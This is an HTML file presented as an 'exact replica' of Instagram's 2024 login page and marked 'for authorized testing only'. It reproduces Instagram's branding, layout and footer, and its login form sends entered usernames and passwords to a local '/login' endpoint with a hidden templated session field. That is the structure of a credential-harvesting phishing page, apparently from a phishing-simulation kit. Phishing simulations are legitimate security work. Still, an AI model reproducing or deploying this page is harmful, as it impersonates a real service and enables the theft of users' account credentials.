<!-- Instagram — exact replica (2024) — FOR AUTHORIZED TESTING ONLY -->
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fafafa;color:#262626}
  .wrap{max-width:935px;margin:32px auto;display:flex;align-items:center;justify-content:center;gap:32px;padding:0 20px}
  .phones{width:380px;height:581px;background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="380" height="581" viewBox="0 0 380 581"><rect width="380" height="581" rx="24" fill="%23000"/><rect x="12" y="12" width="356" height="557" rx="16" fill="%23fff"/><rect x="100" y="12" width="180" height="20" rx="10" fill="%23000"/></svg>') center/contain no-repeat;display:flex;align-items:center;justify-content:center}
  .phones-inner{width:250px;height:430px;background:#fff;border:1px solid #dbdbdb;display:flex;flex-direction:column;overflow:hidden}
  .phones-inner img{width:100%;height:100%;object-fit:cover}
  .main{width:100%;max-width:350px;display:flex;flex-direction:column;gap:10px}
  .card{background:#fff;border:1px solid #dbdbdb;padding:32px 40px 20px;display:flex;flex-direction:column;align-items:center}
  .logo{width:175px;height:51px;background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="Billabong,Brush Script MT,cursive" font-size="36" fill="%23262626">Instagram</text></svg>') center/contain no-repeat;margin:12px 0}
  .logo h1{font-family:"Billabong","Brush Script MT",cursive;font-size:32px;font-weight:400;letter-spacing:.5px}
  form{width:100%;display:flex;flex-direction:column;gap:6px;margin-top:12px}
  .field{position:relative}
  .field input{width:100%;height:36px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:9px 8px 7px;font-size:12px;outline:none}
  .field input:focus{background:#fff;border-color:#a8a8a8}
  .field input.has-error{border-color:#ed4956}
  .field label{position:absolute;left:8px;top:50%;transform:translateY(-50%);font-size:12px;color:#8e8e8e;pointer-events:none;transition:.1s;background:#fafafa;padding:0 2px}
  .field input:focus + label,.field input:not(:placeholder-shown) + label{top:0;font-size:10px}
  .error{font-size:12px;color:#ed4956;display:none;margin:2px 0}
  .error.show{display:block}
  .btn{margin-top:8px;height:32px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;opacity:.7}
  .btn.enabled{opacity:1}
  .btn.enabled:hover{background:#1877f2}
  .divider{display:flex;align-items:center;gap:16px;margin:16px 0;color:#8e8e8e;font-size:13px;font-weight:600}
  .divider::before,.divider::after{content:"";flex:1;height:1px;background:#dbdbdb}
  .fb{color:#385185;font-size:14px;font-weight:600;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:8px}
  .forgot{font-size:12px;color:#00376b;text-decoration:none;margin-top:12px}
  .card2{background:#fff;border:1px solid #dbdbdb;padding:20px;text-align:center;font-size:14px}
  .card2 a{color:#0095f6;font-weight:600;text-decoration:none}
  .apps{text-align:center;font-size:14px;margin-top:12px}
  .apps img{height:40px;margin:8px 4px}
  .footer{max-width:935px;margin:40px auto 40px;padding:0 20px;text-align:center;color:#8e8e8e;font-size:12px;line-height:16px}
  .footer a{color:#8e8e8e;text-decoration:none;margin:0 6px}
  @media(max-width:875px){.phones{display:none}.wrap{margin:0 auto;max-width:350px;padding:20px}}
  @media(max-width:450px){.card{border:none;background:transparent;padding:20px}.card2{border:none;background:transparent}.main{gap:8px}}
</style>
</head>
<body>
<div class="wrap">
  <div class="phones" aria-hidden="true"><div class="phones-inner"><img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='250' height='430'><rect width='250' height='430' fill='%23fafafa'/><circle cx='125' cy='180' r='50' fill='%23dbdbdb'/><rect x='40' y='250' width='170' height='12' rx='6' fill='%23dbdbdb'/><rect x='60' y='270' width='130' height='12' rx='6' fill='%23efefef'/></svg>" alt=""></div></div>
  <div class="main">
    <div class="card">
      <div class="logo" aria-label="Instagram"></div>
      <form id="login-form" method="POST" action="/login" novalidate>
        <input type="hidden" name="ssid" value="{ssid}">
        <div class="field">
          <input id="username" name="username" type="text" placeholder=" " autocomplete="username" spellcheck="false" required>
          <label for="username">Phone number, username or email address</label>
        </div>
        <div class="error" id="err-user">Enter a valid email address</div>
        <div class="field">
          <input id="password" name="password" type="password" placeholder=" " autocomplete="current-password" required>
          <label for="password">Password</label>
        </div>
        <div class="error" id="err-pass">Enter your password</div>
        <button type="submit" class="btn" id="btn" disabled>Log in</button>
      </form>
      <div class="divider">OR</div>
      <a class="fb" href="#"><svg width="16" height="16" viewBox="0 0 24 24" fill="#385185"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg> Log in with Facebook</a>
      <a class="forgot" href="#">Forgotten your password?</a>
    </div>
    <div class="card2">Don't have an account? <a href="#">Sign up</a></div>
    <div class="apps">Get the app.<br><img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='136' height='40'><rect width='136' height='40' rx='5' fill='%23000'/><text x='50%' y='50%' dominant-baseline='middle' text-anchor='middle' fill='%23fff' font-size='10' font-family='Arial'>Download on the App Store</text></svg>" alt=""><img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='136' height='40'><rect width='136' height='40' rx='5' fill='%23000'/><text x='50%' y='50%' dominant-baseline='middle' text-anchor='middle' fill='%23fff' font-size='10' font-family='Arial'>GET IT ON Google Play</text></svg>" alt=""></div>
  </div>
</div>
<footer class="footer">
  <div><a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">Contact uploading</a><a href="#">Meta Verified</a></div>
  <div style="margin-top:12px"><select style="border:none;background:transparent;color:#8e8e8e;font-size:12px"><option>English (UK)</option></select> © 2025 Instagram from Meta</div>
</footer>
<script>
  const userEl = document.getElementById('username');
  const passEl = document.getElementById('password');
  const btn = document.getElementById('btn');
  function isValidEmail(v){ return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
  function updateBtn(){
    const u = userEl.value.trim(), p = passEl.value;
    if(u && p){ btn.disabled=false; btn.classList.add('enabled'); } else { btn.disabled=true; btn.classList.remove('enabled'); }
  }
  userEl.addEventListener('input', ()=>{ document.getElementById('err-user').classList.remove('show'); userEl.classList.remove('has-error'); updateBtn(); });
  passEl.addEventListener('input', ()=>{ document.getElementById('err-pass').classList.remove('show'); passEl.classList.remove('has-error'); updateBtn(); });
  document.getElementById('login-form').addEventListener('submit', (e)=>{
    const u = userEl.value.trim(), p = passEl.value;
    let ok=true;
    document.getElementById('err-user').classList.remove('show'); userEl.classList.remove('has-error');
    document.getElementById('err-pass').classList.remove('show'); passEl.classList.remove('has-error');
    if(!isValidEmail(u)){ document.getElementById('err-user').textContent='Enter a valid email address'; document.getElementById('err-user').classList.add('show'); userEl.classList.add('has-error'); ok=false; }
    if(!p){ document.getElementById('err-pass').classList.add('show'); passEl.classList.add('has-error'); ok=false; }
    if(!ok){ e.preventDefault(); return; }
    btn.textContent='Logging in…'; btn.disabled=true;
  });
</script>
</body>
</html>
